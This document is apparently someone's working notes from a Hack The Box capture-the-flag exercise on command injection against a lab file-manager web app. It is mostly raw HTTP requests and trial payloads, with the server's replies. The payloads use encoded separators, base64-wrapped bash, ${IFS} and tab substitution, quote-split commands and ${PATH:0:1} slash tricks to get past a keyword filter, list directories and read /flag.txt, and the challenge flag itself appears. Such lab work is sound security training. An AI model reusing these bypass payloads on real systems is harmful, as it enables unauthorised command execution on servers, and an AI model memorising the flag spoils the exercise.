# Skills Assessment - Commands Injections

94.237.62.195:42835

514

GET /index.php?to=&view=51459716.txt HTTP/1.1
Host: 94.237.62.195:42835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close


view=51459716.txt%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)

echo -n 'whoami' | base64
d2hvYW1p

POST /index.php?to= HTTP/1.1
Host: 94.237.62.195:42835
Content-Length: 40
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://94.237.62.195:42835
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

ajax=true&content=514%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)&path=.&type=search

GET /index.php?to=&from=51459716.txt HTTP/1.1
Host: 94.237.62.195:42835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

GET /index.php?to=tmp&from=51459716.txt HTTP/1.1
Host: 94.237.62.195:42835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:42835/index.php?to=&from=51459716.txt
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close


51459716.txt%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)

GET /index.php?to=tmp HTTP/1.1
Host: 94.237.62.195:42835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

tmp%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)

POST /index.php?to= HTTP/1.1
Host: 94.237.62.195:42835
Content-Length: 40
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://94.237.62.195:42835
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

ajax=true&content=514%0abash<<<$(base64${IFS}-d<<<d2hvYW1p)&path=.&type=search

<td>www-data:www-data</td>

echo -n 'echo mbappe' | base64
ZWNobyBtYmFwcGU=

ajax=true&content=514%0abash<<<$(base64${IFS}-d<<<ZWNobyBtYmFwcGU=)&path=.&type=search

GET /index.php?to=&view=51459716.txt%0abash<<<$(base64${IFS}-d<<<ZWNobyBtYmFwcGU=)&quickView=1 HTTP/1.1
Host: 94.237.62.195:42835
Accept: text/html, */*; q=0.01
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
X-Requested-With: XMLHttpRequest
Referer: http://94.237.62.195:42835/index.php?to=
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

GET /index.php?to=tmp&from=605311066.txt&finish=1&move=1 HTTP/1.1
Host: 94.237.62.195:42835
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.5249.62 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://94.237.62.195:42835/index.php?to=tmp&from=605311066.txt
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: filemanager=62nrkg2r8iobluh3n2d2105u6l
Connection: close

to=tmp%0abash<<<$(base64${IFS}-d<<<ZWNobyBtYmFwcGU=)

Malicious request denied!

to=tmp&+whoami

Malicious request denied!

to=tmp%0a&{ls,-la}${IFS}${PATH:0:1}home

Malicious request denied!

to=tmp&

Moved from /var/www/html/files/877915113.txt to /var/www/html/files/tmp&

to=%26+echo+mbappe

Malicious request denied!

to=tmp%26mbappe


to=tmp%3b
to=tmp+%3b
to=tmp%26
to=tmp%26%26
to=tmp+%26
to=tmp+%26%26
to=tmp%7c
to=tmp%7c%7c
to=tmp+%7c
to=tmp+%7c%7c

GET /index.php?to=tmp§%26§&from=51459716.txt&finish=1&move=1 HTTP/1.1

%26
Error while moving: mv: cannot stat

%26%26


%3b
+%3b
+%26
+%26%26
%7c
%7c%7c
+%7c
+%7c%7c
Malicious request detected

Tabs : %09
Using ${IFS}

%09%26
${IFS}%26
%26
Error while moving: mv: cannot stat


%09%26%26
${IFS}%26%26
${IFS}%26%26
Error while moving: bash: -c: line 1: syntax error: unexpected endofile

%09%26ip${IFS}a
${IFS}%26ip${IFS}a
%26ip${IFS}a
%09%26%26ip${IFS}a
${IFS}%26%26ip${IFS}a
${IFS}%26%26ip${IFS}a

Malicious request detected

%09%26w"ho"ami
${IFS}%26w"ho"ami
%26w"ho"ami
%09%26%26w"ho"ami
${IFS}%26%26w"ho"ami
${IFS}%26%26w"ho"ami

Payload:	%09%26w"ho"ami

--> OK

%09%26c"a"t%09/flag.txt

Malicious request detected

%09%26c"a"t%09${PATH:0:1}flag.txt

400 Bad Request

%09%26{ls,-la}%09${PATH:0:1}

400 Bad Request

%09%26{ls,-la}

400 Bad Request

%09%26%7Bls%2C-la%7D

Malicious request detected

%09%26%c"a"t%09%24%7BPATH%3A0%3A1%7Dflag.txt

{PATH:0:1}var{PATH:0:1}www{PATH:0:1}html{PATH:0:1}files{PATH:0:1}tmp{PATH:0:1}51459716.txt 

%09%26%c"a"t%09%7BPATH%3A0%3A1%7Dvar%7BPATH%3A0%3A1%7Dwww%7BPATH%3A0%3A1%7Dhtml%7BPATH%3A0%3A1%7Dfiles%7BPATH%3A0%3A1%7Dtmp%7BPATH%3A0%3A1%7D51459716.txt%20%0A

Malicious request detected

%09%26ls

Malicious request detected

%09%26{ls,-la}

Malicious request denied

%09%26%7Bls%2C-la%7D

Malicious request denied

%09%26dir

--> OK

%09%26dir{PATH:0:1}

400 Bad Request

%09%26dir%7BPATH%3A0%3A1%7D

dir{PATH:0:1}: command not found

%09%26dir%09%24%7BPATH%3A0%3A1%7D

400 Bad Request

%09%26dir%24%7BPATH%3A0%3A1%7D

400 Bad Request

%09%26dir%09..

400 Bad Request

${IFS}

%09%26dir%24%7BIFS%7D..

--> OK html

%09%26dir%24%7BIFS%7D%24%7BPATH%3A0%3A1%7D

400 Bad Request

%09%26dir%24%7BIFS%7D${PATH:0:1}

--> OK flag.txt

%09%26c"a"t%24%7BIFS%7D${PATH:0:1}flag.txt

--> OK 
HTB{c0mm4nd3r_1nj3c70r}

The 400 Bad Request was because a carriage return in copy/paste

